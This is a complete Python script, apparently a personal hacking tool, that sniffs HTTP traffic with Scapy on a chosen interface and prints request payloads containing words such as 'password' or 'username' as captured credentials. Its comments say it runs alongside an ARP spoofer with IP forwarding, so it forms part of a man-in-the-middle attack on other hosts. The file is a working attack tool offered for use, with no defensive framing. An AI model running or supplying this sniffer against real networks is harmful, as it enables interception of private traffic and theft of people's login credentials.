#!/usr/bin/python3


# THIS SCRIPT TRIES TO GET TARGET CREDENTIALS 
# FROM HTTP WEBSITES RUN AT THE TARGET END

# NOTE:-
# ARPSPOOFER SCRIPT MUST BE RUNNING ALONGSIDE THIS SCRIPT
# AND IP FORWARDING MUST BE ENABLED IN ORDER FOR
# THIS SCRIPT TO  WORK PROPERLY


from scapy.all import *
from scapy_http import http
import socket as sc
from struct import *
import sys
from termcolor import colored	# use colored text output on the terminal
import optparse as op



words = ["user", "password", "User", "Password", "username", "Username", "Login", "pass", "Pass", "uid"]



def Sniff(interface):
	
	sniff(iface=interface, store=False, prn=process_packets)
	


def process_packets(pkt):
	
	if pkt.haslayer(http.HTTPRequest):																	# if the packet to be processed has the HTTP layer
		url = pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path									# get the URL
		print("[!] Activity detected at : " + url.decode())
		if pkt.haslayer(Raw):																			# load whatever message is available in the raw header (credentials passed can be found here)
#			print("has load")
			load = pkt[Raw].load
#			print(load.decode())
			for w in words:
				if w in str(load):
					print(colored("[+] Potential Credentials found:-\n" + load.decode(), "green"))
					break
				





def main():

	parser = op.OptionParser("Usage: " + sys.argv[0] + " -i INTERFACE_NAME ")
	parser.add_option("-i", dest="interface", type="string", help="Interface to listen on")
	(options, args) = parser.parse_args()
	
	if options.interface == None:
		print(parser.usage)
		quit()
	else:
		try:
			print("[!] Starting the HTTP Credential Sniffer!")
			Sniff(options.interface)
		except KeyboardInterrupt:		
			print("[!] Stopping the HTTP Credential Sniffer!")
			quit()


main()
